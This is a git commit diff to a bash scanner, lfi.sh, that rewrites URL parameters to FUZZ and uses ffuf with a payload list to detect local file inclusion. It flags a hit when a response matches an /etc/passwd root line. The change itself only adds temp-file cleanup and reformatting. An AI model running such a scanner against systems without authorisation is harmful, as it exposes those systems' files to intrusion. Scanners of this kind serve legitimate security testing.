38ef0bd48c80995efb080c8f0ff89986ae2639d8
lemosnlmb <80685782+lemosnlmb@users.noreply.github.com>
2022-07-11 15:05:40 +0100

    Update lfi.sh

--- lfi/lfi.sh
+++ lfi/lfi.sh
@@ -7,5 +7,11 @@ NC='\033[0m'
 
 list=$1
 
-cat $list | grep "=" | qsreplace "FUZZ" > $list.tmp && mv $list.tmp $list
-interlace -tL $list -c "ffuf -v -r -w payloads.txt -u \"_target_\" -mr \"root:[x*]:0:0:\" " 2>/dev/null | grep "| URL |" | awk '{print $4}' | while read url; do echo -e "${RED}Vulnerable to LFI${NC}: $url"; done
+cat $list | grep "=" | qsreplace "FUZZ" > $list.tmp
+interlace -tL $list.tmp -c "ffuf -v -r -w payloads.txt -u \"_target_\" -mr \"root:[x*]:0:0:\" " 2>/dev/null | grep "| URL |" | awk '{print $4}' | while read url
+do 
+  echo -e "${RED}Vulnerable to LFI${NC}: $url"
+done
+
+rm -rf $list.tmp
+
